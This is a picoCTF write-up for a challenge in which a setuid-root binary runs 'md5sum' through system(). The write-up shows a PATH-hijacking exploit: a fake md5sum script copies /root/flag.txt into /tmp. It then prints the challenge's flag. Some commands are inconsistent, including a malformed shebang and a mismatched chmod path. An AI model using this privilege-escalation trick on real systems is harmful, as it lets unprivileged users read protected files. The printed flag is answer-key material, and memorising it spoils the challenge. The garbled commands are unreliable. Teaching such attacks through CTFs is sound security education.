# Description
```
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!
```
---
We are given a `suid` binary that runs as root.
Using IDA to decompile the binary (here:[[./Decompilation]]), we see these 3 lines:
```CPP
std::string::basic_string(v13, "/bin/bash -c 'md5sum /root/flag.txt'", &v11);
...
v5 = (const char *)std::string::c_str(v13);
v12 = system(v5);
...
```
Which translate in to the following in `C`:
```C
system("/bin/bash -c 'md5sum /root/flag.txt'");
```
This is easily exploitable as `md5sum` needs to be looked up, and directory lookup comes before `$PATH` lookup. We can create a script called `md5sum` in the same directory as `flaghasher`, then provide it to `PATH` before the actual `md5sum`;

```shell
$ mkdir /tmp/abcabc
$ cd /tmp/abcabc
$ touch flag.txt
$ printf "#/bin/bash\ncat /root/flag.txt > /tmp/abcabc/flag.txt\necho PWNED\nexit 0\n" > md5sum
$ chmod -R 777 /tmp/abc/abc 
$ PATH=.:$PATH ./flaghasher && cat flag.txt # "which md5sum" will point to ./md5sum
FLAG{}
```

# Flag 
```
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_bb95ff8e}
```